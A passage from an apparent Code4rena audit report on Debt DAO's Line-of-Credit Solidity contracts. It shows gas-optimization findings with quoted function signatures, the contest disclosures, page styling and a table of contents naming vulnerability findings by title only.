);</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L26-L29\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L26-L29</a></p>\n<h2 id=\"g16--functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" style=\"position:relative;\"><a href=\"#g16--functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" aria-label=\"g16  functions guaranteed to revert when called by normal users can be marked payable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑16]  Functions guaranteed to revert when called by normal users can be marked <code>payable</code></h2>\n<p>If a function modifier such as <code>onlyOwner</code> is used, the function will revert if a normal user tries to pay the function. Marking the function as <code>payable</code> will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are\n<code>CALLVALUE</code>(2),<code>DUP1</code>(3),<code>ISZERO</code>(3),<code>PUSH2</code>(3),<code>JUMPI</code>(10),<code>PUSH1</code>(3),<code>DUP1</code>(3),<code>REVERT</code>(0),<code>JUMPDEST</code>(1),<code>POP</code>(2), which costs an average of about <strong>21 gas per call</strong> to the function, in addition to the extra deployment cost.</p>\n<p><em>There are 4 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"153\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">340</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">borrow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">341           </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">342           </span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">343           </span><span class=\"mtk11\">whileActive</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">344           </span><span class=\"mtk11\">onlyBorrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">345:          </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L340-L345\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L340-L345</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"154\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SecuredLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">rollover</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newLine</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">49        </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">50        </span><span class=\"mtk11\">onlyBorrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">51        </span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">52:       </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L48-L52\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L48-L52</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"155\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interest</span><span class=\"mtk1\">-</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterestRateCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">34</span><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">accrueInterest</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">35            </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">36            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">drawnBalance</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">37            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">facilityBalance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">38:       ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyLineContract</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">74</span><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setRate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">75            </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">76            </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dRate</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">77            </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fRate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">78:       ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyLineContract</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L34-L38\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L34-L38</a></p>\n<hr>\n<h2 id=\"excluded-findings\" style=\"position:relative;\"><a href=\"#excluded-findings\" aria-label=\"excluded findings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Excluded findings</h2>\n<p>These findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness</p>\n<h2 id=\"gas-optimizations-summary-1\" style=\"position:relative;\"><a href=\"#gas-optimizations-summary-1\" aria-label=\"gas optimizations summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations Summary</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n<th align=\"center\">Total Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G‑17]</td>\n<td align=\"left\">Using <code>bool</code>s for storage incurs overhead</td>\n<td align=\"center\">1</td>\n<td align=\"center\">17100</td>\n</tr>\n<tr>\n<td>[G‑18]</td>\n<td align=\"left\">Using <code>> 0</code> costs more gas than <code>!= 0</code> when used on a <code>uint</code> in a <code>require()</code> statement</td>\n<td align=\"center\">3</td>\n<td align=\"center\">18</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 4 instances over 2 issues with <strong>17118 gas</strong> saved</p>\n<p>Gas totals use lower bounds of ranges and count two iterations of each <code>for</code>-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.</p>\n<h2 id=\"g17--using-bools-for-storage-incurs-overhead\" style=\"position:relative;\"><a href=\"#g17--using-bools-for-storage-incurs-overhead\" aria-label=\"g17  using bools for storage incurs overhead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑17]  Using <code>bool</code>s for storage incurs overhead</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"156\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Booleans are more expensive than uint256 or any type that takes up a full</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// word because each write operation emits an extra SLOAD to first read the</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// slot&#39;s contents, replace the bits taken up by the boolean, and then write</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// back. This is the compiler&#39;s defense against contract upgrades and</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// pointer aliasing, and it cannot be disabled.</span></span></span></code></pre>\n<p><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27</a>\nUse <code>uint256(1)</code> and <code>uint256(2)</code> for true/false to avoid a Gwarmaccess (<strong><a href=\"https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058\">100 gas</a></strong>) for the extra SLOAD, and to avoid Gsset (<strong>20000 gas</strong>) when changing from <code>false</code> to <code>true</code>, after having been <code>true</code> in the past</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"157\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MutualConsent</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">15</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mutualConsents</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L15\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L15</a></p>\n<h2 id=\"g18--using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement\" style=\"position:relative;\"><a href=\"#g18--using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement\" aria-label=\"g18  using  0 costs more gas than  0 when used on a uint in a require statement permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑18]  Using <code>> 0</code> costs more gas than <code>!= 0</code> when used on a <code>uint</code> in a <code>require()</code> statement</h2>\n<p>This change saves <strong><a href=\"https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png\">6 gas</a></strong> per instance. The optimization works until solidity version <a href=\"https://gist.github.com/IllIllI000/bf2c3120f24a69e489f12b3213c06c94\">0.8.13</a> where there is a regression in gas costs.</p>\n<p><em>There are 3 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"158\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EscrowLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">91</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">161</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">198</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L91\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L91</a></p>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-6\">High Risk Findings (6)</a></p>\n<ul>\n<li><a href=\"#h-01-call-to-declareinsolvent-would-revert-when-contract-status-reaches-liquidation-point-after-repayment-of-credit-position-1\">[H-01] Call to <code>declareInsolvent()</code> would revert when contract status reaches liquidation point after repayment of credit position 1</a></li>\n<li><a href=\"#h-02-non-existing-revenue-contract-can-be-passed-to-claimrevenue-to-send-all-tokens-to-treasury\">[H-02] Non-existing revenue contract can be passed to claimRevenue to send all tokens to treasury</a></li>\n<li><a href=\"#h-03-addcredit--increasecredit-cannot-be-called-by-lender-first-when-token-is-eth\">[H-03] addCredit / increaseCredit cannot be called by lender first when token is ETH</a></li>\n<li><a href=\"#h-04-borrower-can-close-a-credit-without-repaying-debt\">[H-04] Borrower can close a credit without repaying debt</a></li>\n<li><a href=\"#h-05-borrower-can-craft-a-borrow-that-cannot-be-liquidated-even-by-arbiter-\">[H-05] Borrower can craft a borrow that cannot be liquidated, even by arbiter. </a></li>\n<li><a href=\"#h-06-repaying-a-line-of-credit-with-a-higher-than-necessary-claimed-revenue-amount-will-force-the-borrower-into-liquidation\">[H-06] Repaying a line of credit with a higher than necessary claimed revenue amount will force the borrower into liquidation</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-11\">Medium Risk Findings (11)</a></p>\n<ul>\n<li><a href=\"#m-01-borrower-can-by-mistake-add-own-money-to-credit-if-credit-is-in-eth\">[M-01] Borrower can by mistake add own money to credit if credit is in ETH</a></li>\n<li><a href=\"#m-02-mutual-consent-cannot-be-revoked-and-stays-valid-forever\">[M-02] Mutual consent cannot be revoked and stays valid forever</a></li>\n<li><a href=\"#m-03-borrowerlender-excessive-eth-not-refunded-and-permanently-locked-in-protocol\">[M-03] Borrower/Lender excessive ETH not refunded and permanently locked in protocol</a></li>\n<li><a href=\"#m-04-lender-can-trade-claimtoken-in-a-malicious-way-to-steal-the-borrowers-money-via-claimandrepay-in-spigotedline-by-using-malicious-zeroextradedata\">[M-04] Lender can trade claimToken in a malicious way to steal the borrower’s money via <code>claimAndRepay()</code> in SpigotedLine by using malicious zeroExTradeData</a></li>\n<li><a href=\"#m-05-reentrancy-bug-allows-lender-to-steal-other-lenders-funds\">[M-05] Reentrancy bug allows lender to steal other lenders funds</a></li>\n<li><a href=\"#m-06-the-lender-can-draw-out-extra-credit-token-from-borrowers-account\">[M-06] The lender can draw out extra credit token from borrower’s account</a></li>\n<li><a href=\"#m-07-whitelisted-functions-arent-scoped-to-revenue-contracts-and-may-lead-to-unnoticed-calls-due-to-selector-clashing\">[M-07] Whitelisted functions aren’t scoped to revenue contracts and may lead to unnoticed calls due to selector clashing</a></li>\n<li><a href=\"#m-08-mistakenly-sent-eth-could-be-locked\">[M-08] Mistakenly sent eth could be locked</a></li>\n<li><a href=\"#m-09-variable-balance-erc20-support\">[M-09] Variable balance ERC20 support</a></li>\n<li><a href=\"#m-10-addresscallvaluex-should-be-used-instead-of-payabletransfer\">[M-10] <code>address.call{value:x}()</code> should be used instead of <code>payable.transfer()</code></a></li>\n<li><a href=\"#m-11-lender-can-reject-closing-a-position\">[M-11] Lender can reject closing a position</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#low-risk-issues-summary\">Low Risk Issues Summary</a></li>\n<li><a href=\"#l01--unusedempty-receivefallback-function\">L‑01  Unused/empty <code>receive()</code>/<code>fallback()</code> function</a></li>\n<li><a href=\"#l02--missing-checks-for-address0x0-when-assigning-values-to-address-state-variables\">L‑02  Missing checks for <code>address(0x0)</code> when assigning values to <code>address</code> state variables</a></li>\n<li><a href=\"#l03--open-todos\">L‑03  Open TODOs</a></li>\n<li><a href=\"#non-critical-issues-summary\">Non-Critical Issues Summary</a></li>\n<li><a 